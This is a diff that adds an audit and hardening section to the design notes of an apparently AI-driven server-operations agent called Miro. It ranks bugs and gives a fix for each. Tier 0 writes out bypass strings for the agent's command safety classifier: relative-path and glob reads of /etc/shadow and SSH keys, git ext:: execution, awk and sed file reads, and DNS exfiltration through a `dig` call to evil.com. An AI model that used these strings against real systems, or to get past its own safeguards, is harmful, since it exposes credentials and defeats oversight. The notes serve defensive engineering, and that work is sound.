@@ -1920,3 +1920,116 @@ finding is what surfaced the credential-bootstrap and control-method gaps in 5.3
   `OAuthCredential` type exactly and can be handed straight to a `CredentialStore.modify()`. Treat
   that file as a real secret the moment it's written — move/import it and delete the original
   immediately, never leave it sitting in a repo directory.
+
+### 5.11 Audit + hardening pass (2026-09-02)
+
+After eight live acceptance runs the user called Miro "buggy out of its mind" and asked for a broad
+audit + a plan to make it "the best software it can be," fanning out subagents. Six read-only
+auditors (opus: classifier/sandbox security, engine correctness, self-extension robustness; sonnet:
+secret-leak paths, protocol/ui-model/TUI, general code quality) swept the codebase in parallel. An
+external reviewer's framing the user relayed: the safety/operation engine is the quietly-excellent
+sellable pillar; autonomous self-extension is the flashy high-risk one — go hybrid, keep the
+research loop that works, don't swing to fully hand-curated. The findings, in fix-priority tiers.
+Each was verified by the auditor (many by running the actual pure functions); file:line included.
+
+**Tier 0 — classifier secret-leak bypasses (the security moat; pure functions, test in the corpus).**
+- C1 CRITICAL: relative `..` tokens bypass every `^/`-anchored sensitive rule — `cat
+  ../../../../etc/shadow`, `base64 ../../../var/lib/miro/miro.db` classify `read` and (as root, with
+  `CAP_DAC_READ_SEARCH`) leak. `normalizePath` returns any non-absolute path unchanged
+  (classify.ts:353-354); `pathTokens`/`isSensitivePath` then never match. Fix: resolve tokens
+  against `/` (or refuse a `..` segment) before matching; a `read` requires absolute, normalized
+  path tokens.
+- C2 CRITICAL: a glob metachar in a non-command arg dodges the literal sensitive match — `base64
+  /etc/shado?`, `cat /home/miro/.ss?/id_rsa`. Only argv[0] sets `globInCommand` (classify.ts:256).
+  Fix: a glob metachar in ANY arg demotes read→mutate (or expand-and-check).
+- C3 HIGH: git transport/config subcommands are arbitrary exec still classed read — `git ls-remote
+  'ext::sh -c ...'`, `git -c diff.external=... log -p`. Fix: reject `ext::`/`fd::` remotes and
+  dangerous `-c` keys (classify.ts:833-851).
+- C4 HIGH: `awk 'BEGIN{while((getline l < "/etc/shadow")>0)...}'` and `sed 'r /etc/shadow'` read
+  secret files, classed read (the path is inside the program string, not a path token). Fix: awk
+  `getline <` / sed `r|R|w|W` → not read.
+- C5 HIGH: non-HTTP network readers reach public hosts — `dig X.evil.com`, `nc -z`, `ping -p` — a
+  read that egresses, DNS-exfiltrating any literal in context. Only curl/wget check
+  `isLocalOrPrivateUrl`. Fix: apply a local/private destination check to the other NETWORK_READERS.
+- C6 LOW: `/proc/thread-self/environ` + `/proc/*/task/*/environ` not in the sensitive set (not
+  currently reachable, close for consistency). C7: `redactSecretsInText` fails on encoded output and
+  shadow lines — it is a backstop only; the structural fixes above are the real defense.
+
+**Tier 1 — secret values reaching model context / logs / a third-party LLM.**
+- L1 CRITICAL: apply-failure Error messages carry the raw response body / stderr unredacted
+  (http-mutation.ts:175, shell-command.ts:81) → engine's `message` (engine.ts:150) → returned to the
+  model un-redacted (operation-tools.ts spreads `result.message`), persisted plaintext in
+  `operations.error` and as an `incident` memory row, and embedded verbatim in a Dreaming reflection
+  prompt sent to a real provider (dreaming.ts:63). Fix: `redactSecretsInText` at each Error site.
+- L2 CRITICAL: the `shell_command` WRITE branch returns raw stdout/stderr (operation-tools.ts:104) —
+  every mutate/destructive shell command, unlike the read branch four lines up. Fix: redact both.
+- L3 CRITICAL: extension tool/diagnostic results carry zero redaction, and generated code holds real
+  `ctx.secrets` values (host-entry.ts:270, host.ts, extension-tools.ts:70). Fix: redact the returned
+  value before it reaches the model.
+- L4 HIGH: `redactSecretsInText` misses `cookie|jwt|session|bearer` (classify.ts:389). Fix: extend.
+- L5 HIGH: `memory.remember()` has no redaction choke point; a value once in front of the model can
+  be re-saved as a `preference`/`server_fact` and injected into every future turn. Fix: redact in
+  `remember()` itself. H2: `capturedState` is persisted plaintext in the same DB as encrypted
+  secrets; `chmod 0600` the DB + MIRO_DIR at boot.
+
+**Tier 2 — durability / data-loss (engine + boot).**
+- E1 HIGH: `reconcileOperations` ignores the persisted `op.plan`, so after a crash it re-runs the
+  false-rollback for an irreversible op — the exact bug `applied_unverified` was built to kill, but
+  the crash path has no such branch (engine.ts:248-253). Fix: read `op.plan`; irreversible + verify
+  fail → commit, not rollback.
+- E2 HIGH: same gap auto-commits an interrupted lifeline op, bypassing the reachability gate that
+  exists to prevent locking the user out (engine.ts:245-247). Fix: lifeline + interrupted → roll
+  back, never headless-commit.
+- D1 HIGH data-loss: `/memory forget %` or an empty arg is a LIKE-wildcard wipe of ALL memory incl.
+  capability docs, no undo (memory/store.ts:212). Fix: escape `%`/`_`, refuse empty/bare-wildcard.
+- E3 MED: snapshot archive id `shell-${Date.now()}` collides for concurrent shell ops, so one op's
+  rollback restores another's bytes (shell-command.ts:72). Fix: add a random suffix (trash.ts does).
+- D2 HIGH leak/stuck-op: a dropped connection during any pending confirmation leaks the
+  `pendingAnswers` closure forever and leaves the operation stuck "awaiting confirmation" in the DB;
+  only lifeline has a timeout (index.ts close() is a no-op). Fix: settle all pendingAnswers on
+  socket close (cancel sentinel); consider a timeout on op_confirm/ask.
+
+**Tier 3 — client correctness (protocol / ui-model / TUI).**
+- U1 CRITICAL: ui-model's single `pending` slot overwrites a still-open question — a lifeline
+  countdown gets dropped from the UI and can never be answered; a non-lifeline orphan hangs the
+  daemon turn forever. Fix: queue/keyed pending.
+- U2 CRITICAL: nothing blocks a second `chat` mid-turn; the daemon dispatches `handleChat`
+  un-awaited (index.ts:413) → two turns race on one ConnState. Fix: gate the input on `!working`
+  and/or serialize per-connection.
+- U3 HIGH: `reply_delta` reuses one block id across interleaved narration segments (seq not bumped)
+  → duplicate React keys. U4 HIGH: no reconnect — a restarted daemon leaves the TUI silently
+  "healthy" forever (connection.ts close/error are no-ops). U5 HIGH: client `JSON.parse` on one bad
+  line is unguarded (connection.ts:52). Plus MED/LOW: unknown-id updates dropped silently; pending
+  never cleared by its own deadline; unbounded transcript/createLineBuffer; the `esc interrupt` hint
+  with nothing behind it; the outcome union hand-copied 3× instead of derived.
+
+**Tier 4 — make self-extension actually promote (4 structural causes, not 8 bugs).**
+- X1: the validator drip-feeds one error class per attempt (5 short-circuiting gates) inside a
+  3-attempt budget — aggregate and return ALL independent failures at once (validate.ts:99-153).
+- X2: each retry blind-rewrites all five files (staging discarded, prior code not echoed) — persist
+  staging / allow changed-files-only / echo prior code so the model edits (learn-agent.ts:250-257).
+- X3 (highest leverage, lowest cost): NO reference extension exists anywhere and the full
+  `validateExtension` has ZERO test coverage — hand-author one correct extension (Gotify), check it
+  in, prove the pipeline against it in a test, and paste it verbatim into the prompt as a worked
+  example.
+- X4: generated `tests.ts` is a redundant second codegen surface (its own failure class) that the
+  live-probe + dry-run already cover — drop it from the gating set.
+- X5 (design, defer): move codegen toward a mostly-declarative spec (tool = path+projection,
+  operation = binding template) so TS syntax/type/import/async errors vanish as a category; keep
+  freeform TS only for irregular reads. Verdict: hybrid, keep autonomous research, don't hand-curate
+  everything. Browser/Bun.WebView is janky but only runs during research, never in promoted code —
+  leave it.
+
+**Tier 5 — hardening / consistency (lower severity).** shell_command/file_write have no
+`{{secret:ref}}` mechanism or literal-credential guard, unlike http_mutation (asymmetric — H1);
+`web_search` fetch has no timeout, hangs a turn (H3); no cancel ClientMessage / AbortController (the
+`esc interrupt` gap — H4); no per-package tsconfig, so `tsc` checks the whole monorepo every time
+(H5); inventory listServices/serviceLogs/detectGpus lack the unreachable-service try/catch their
+siblings have; boot-order closes over not-yet-declared `db`/`secretStore` (TDZ one refactor away);
+`applied_unverified` doesn't bump `successful_runs` (decide explicitly); a throwing
+describe()/captureState leaves a phantom `planning` row with no terminal event.
+
+**Execution order:** Tier 0 → Tier 1 (safety first; these are the sellable pillar and the classifier
+ones are pure-function testable in the corpus with the auditor's exact exploit strings) → Tier 2 →
+Tier 3 → Tier 4 (X3+X1+X4 to finally promote an extension) → Tier 5. Commit per tier at green
+(bun test + tsc across packages); live-verify the leak fixes and the reconcile fixes on the dev VM.
